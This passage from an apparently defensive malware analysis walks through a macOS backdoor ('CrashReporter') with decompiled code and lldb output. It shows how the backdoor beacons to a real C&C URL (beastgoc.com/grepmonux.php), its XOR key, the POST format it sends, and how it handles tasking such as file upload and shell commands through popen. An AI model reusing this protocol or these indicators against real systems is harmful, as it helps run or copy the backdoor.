</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>            <span style="color:#66d9ef">if</span> ((var_1C <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x3</span>) <span style="color:#f92672">&amp;&amp;</span> (strcmp(r14, <span style="color:#e6db74">&#34;200&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>)) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>                    rbx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>            }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>            <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>                    rbx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>            }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>    rax <span style="color:#f92672">=</span> rbx;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>    <span style="color:#66d9ef">return</span> rax;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span>}</span></span></code></pre></div>
<p>After allocating two buffers, the <code>conn_to_base</code> function initializes one of the buffers with the (randomly) generated token, the binary&rsquo;s version (<code>_g_version</code>), and the process&rsquo;s pid.</p>
<p>The version, is found at <code>0x0000000100003414</code>, and is set to <code>0x1</code> (likely indicating this is version 1.0 of the binary).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>_g_version:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#ae81ff">0x0000000100003414</span>  dd  <span style="color:#ae81ff">0x00000001</span></span></span></code></pre></div>
<p>The <code>conn_to_base</code> function then invokes a function named <code>send_to_base</code> (we&rsquo;ll get to this shortly). If that function returns exactly three bytes, set to the string <code>200</code> the <code>conn_to_base</code> will return a 0, indicating success. (Recall the <code>main</code> function is sitting in a loop, wait for upon this success will invoke the <code>listen_message()</code> function).</p>
<p>What does the <code>send_to_base</code> function do? If you guessed &ldquo;connect to a C&amp;C server&rdquo; you&rsquo;re correct!</p>
<p>Though the function is rather long, it&rsquo;s logic can be summarized as follows:</p>
<ul>
<li>
<p>Construct the URL of the C&amp;C server: <code>https://beastgoc.com/grepmonux.php</code> <br>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
CrashReporter`send_to_base:
->  0x100001895 <+1050>: callq  sprintf
    
Target 0: (CrashReporter) stopped.
(lldb) x/s $rsi
0x100002c0d: "https://%s/grepmonux.php"
(lldb) x/s $rdx
0x100002c00: "beastgoc.com"
</pre>
</div> <br>
Note this URL resolved to <code>185.228.83.32</code> and at the time of analysis was still up and responsive.</p>
</li>
<li>
<p>Encrypt any passed in data (such as the generated token, the binary&rsquo;s version (<code>_g_version</code>), and the process id). <br>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#ae81ff">0x000000010000170e</span> <span style="color:#ae81ff">488</span>D0DEB1C0000         lea        rcx, qword [_cbc_iv]
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>;xor loop
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span><span style="color:#ae81ff">0x0000000100001715</span> <span style="color:#ae81ff">89</span>C2                   mov        edx, eax
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span><span style="color:#ae81ff">0x0000000100001717</span> <span style="color:#ae81ff">83E20</span>F                 and        edx, <span style="color:#ae81ff">0xf</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span><span style="color:#ae81ff">0x000000010000171a</span> <span style="color:#ae81ff">8</span>A140A                 mov        dl, byte [rdx<span style="color:#f92672">+</span>rcx]
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span><span style="color:#ae81ff">0x000000010000171d</span> <span style="color:#ae81ff">41301404</span>               xor        byte [r12<span style="color:#f92672">+</span>rax], dl
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span><span style="color:#ae81ff">0x0000000100001721</span> <span style="color:#ae81ff">48FF</span>C0                 inc        rax
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span><span style="color:#ae81ff">0x0000000100001724</span> <span style="color:#ae81ff">4839</span>C3                 cmp        rbx, rax
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span><span style="color:#ae81ff">0x0000000100001727</span> <span style="color:#ae81ff">75</span>EC                   jne        loc_100001715</span></span></code></pre></div>
Note the xor &ldquo;encryption&rdquo; key is stored at <code>0x0000000100003400</code> in variable named: <code>_cbc_iv</code>:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>(lldb) x<span style="color:#f92672">/</span>s <span style="color:#ae81ff">0x0000000100003400</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#ae81ff">0x100003400</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;X,%`PMk--Jj8s+6=</span><span style="color:#ae81ff">\x02</span><span style="color:#e6db74">&#34;</span></span></span></code></pre></div></p>
</li>
<li>
<p>Send an HTTP <code>POST</code> request to <code>https://beastgoc.com/grepmonux.php</code> containing the following data:
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
(lldb)x/s 0x100260000
0x100260000: "--jGzAcN6k4VsTRn9\r\nContent-Disposition: form-data; name="token"; \r\n\r\n756222899\r\n--jGzAcN6k4VsTRn9\r\nContent-Disposition: form-data; name="query"; \r\n\r\nconn\r\n--jGzAcN6k4VsTRn9\r\nContent-Disposition: form-data; name="content"; filename="mont.jpg"\r\nContent-Type: application/octet-stream\r\n\r\n\xffffffeb'6MQMk-|Oj8\r\n--jGzAcN6k4VsTRn9--\r\n"

</pre>
</div><br>
Values such as <code>token</code>, <code>query</code>, <code>content</code> and <code>mont.jpg</code> are hardcoded in the binary:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-NASM" data-lang="NASM"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00000001000016cc</span> <span style="color:#ae81ff">48</span>B8636F6E74656E7400   movabs     rax, <span style="color:#e6db74">&#39;content&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#a6e22e">...</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00000001000016f4</span> <span style="color:#ae81ff">48</span>B96D6F6E742E6A7067   movabs     rcx, <span style="color:#e6db74">&#39;mont.jpg&#39;</span></span></span></code></pre></div>
And what about the <code>\xffffffeb'6MQMk-|Oj8</code>? That&rsquo;s the data (token, version, pid), that was xor encrypted!</p>
</li>
<li>
<p>In a callback block (set via: <code>[r12 dataTaskWithRequest:r13 completionHandler:&amp;callback]</code>), parse the response from the C&amp;ampC; server. Specifically the length of the response is checked, and if it&rsquo;s non-zero, the bytes of the response are extracted: <br>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ObjC" data-lang="ObjC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">if</span> ([r14 length] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    rax <span style="color:#f92672">=</span> [r14 length];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>    <span style="color:#f92672">*</span>(int32_t <span style="color:#f92672">*</span>)<span style="color:#f92672">*</span>(r12 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x30</span>) <span style="color:#f92672">=</span> rax;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>    [r14 getBytes:<span style="color:#f92672">*</span>(r12 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x38</span>) length:rax];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>}</span></span></code></pre></div></p>
</li>
</ul>
<p>The first time the <code>send_to_base</code> function is invoked (via the <code>conn_to_base</code> function), it succeeds: the C&amp;C server returns three bytes containing the string <code>200</code>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
(lldb) Target 0: (CrashReporter) stopped.
(lldb) x/s 0x100230000
0x100230000: "200"

</pre>
</div>
<p>Recall that when the code returns back up into the <code>main</code> function, the <code>listen_message</code> function will now be executed:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">while</span> (conn_to_base() <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    sleep(<span style="color:#ae81ff">0x5</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>usleep(<span style="color:#ae81ff">0x186a0</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>rax <span style="color:#f92672">=</span> listen_message();</span></span></code></pre></div></p>
<p>The <code>listen_message</code> function (re)invokes the <code>send_to_base</code> function and parses an encrypted response from the C&amp;C server. Depending on the response, it performs various actions. In other words, it&rsquo;s expecting tasking from the remote server!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">listen_message</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>send_to_base(_g_token, <span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">0x0</span>, r12, r13, <span style="color:#ae81ff">0x1</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span><span style="color:#75715e">//decrypt
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span><span style="color:#75715e"></span><span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    (r12 <span style="color:#f92672">+</span> rax) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int8_t</span> <span style="color:#f92672">*</span>)(r12 <span style="color:#f92672">+</span> rax) <span style="color:#f92672">^</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int8_t</span> <span style="color:#f92672">*</span>)((rax <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xf</span>) <span style="color:#f92672">+</span> _cbc_iv);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>    rax <span style="color:#f92672">=</span> rax <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>} <span style="color:#66d9ef">while</span> (rbx <span style="color:#f92672">!=</span> rax);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span><span style="color:#75715e">//handle tasking (commands)
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (strcmp(r12, <span style="color:#e6db74">&#34;exit&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) <span style="color:#66d9ef">goto</span> exit;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span><span style="color:#66d9ef">if</span> (strcmp(r12, <span style="color:#e6db74">&#34;kcon&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) <span style="color:#66d9ef">goto</span> kcon;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span><span style="color:#66d9ef">if</span> (is_str_start_with(r12, <span style="color:#e6db74">&#34;up &#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) <span style="color:#66d9ef">goto</span> up;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>...</span></span></code></pre></div>
<p>Unfortunately during analysis, the C&amp;C server did not return any tasking. However, via static analysis, we can fairly easily ascertain the malware&rsquo;s capabilities.</p>
<p>For example, the malware supports an &ldquo;exit&rdquo; command, which will (unsurprisingly) causes the malware to exit:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">if</span> (strcmp(r12, <span style="color:#e6db74">&#34;exit&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) <span style="color:#66d9ef">goto</span> exit;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>exit:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    r14 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x250</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>    var_434 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    __bzero(r12, <span style="color:#ae81ff">0x30000</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    send_to_base(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int32_t</span> <span style="color:#f92672">*</span>)_g_token, r14, <span style="color:#ae81ff">0x2</span>, r12, <span style="color:#f92672">&amp;</span>var_434, <span style="color:#ae81ff">0x2</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    free(r12);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>    free(r14);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>    exit(<span style="color:#ae81ff">0x0</span>);</span></span></code></pre></div></p>
<p>If the malware receives the <code>up</code> command, it appears to contain logic to open then write to a a file (i.e. upload a file from the C&amp;C server to an infected host):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">if</span> (is_str_start_with(r12, <span style="color:#e6db74">&#34;up &#34;</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>{
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    <span style="color:#75715e">//open file
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span><span style="color:#75715e"></span>    rax <span style="color:#f92672">=</span> fopen(<span style="color:#f92672">&amp;</span>var_430, <span style="color:#e6db74">&#34;wb&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    <span style="color:#75715e">//(perhaps) get file contents from C&amp;C server?
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span><span style="color:#75715e"></span>    send_to_base(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int32_t</span> <span style="color:#f92672">*</span>)_g_token, r14, <span style="color:#ae81ff">0x2</span>, r12, r13, <span style="color:#ae81ff">0x2</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    <span style="color:#75715e">//decrypt
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>          (r12 <span style="color:#f92672">+</span> rax) <span style="color:#f92672">=</span> (r12 <span style="color:#f92672">+</span> rax) <span style="color:#f92672">^</span> (rax <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xf</span>) <span style="color:#f92672">+</span> _cbc_iv);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>           rax <span style="color:#f92672">=</span> rax <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>    } <span style="color:#66d9ef">while</span> (rbx <span style="color:#f92672">!=</span> rax);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>    <span style="color:#75715e">//write out to disk
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span><span style="color:#75715e"></span>    fwrite(r12, rbx, <span style="color:#ae81ff">0x1</span>, var_440);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>    <span style="color:#75715e">//close
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span><span style="color:#75715e"></span>    fclose(var_440);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>}</span></span></code></pre></div>
<p>Other commands, will cause the malware to invoke a function named: <code>proc_cmd</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">if</span> ((rbx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x7</span>) <span style="color:#f92672">||</span> (is_str_start_with(r12, <span style="color:#e6db74">&#34;stand &#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>)) 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>   <span style="color:#66d9ef">goto</span> loc_10000241c;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>loc_10000241c:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>    rax <span style="color:#f92672">=</span> proc_cmd(r12, r14, <span style="color:#f92672">&amp;</span>var_438);</span></span></code></pre></div>
<p>The <code>proc_cmd</code> function appears to execute a command via the shell (specifically via the <code>popen</code> API):
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">proc_cmd</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span> arg0, <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span> arg1, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span> arg2) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    r13 <span style="color:#f92672">=</span> arg2;
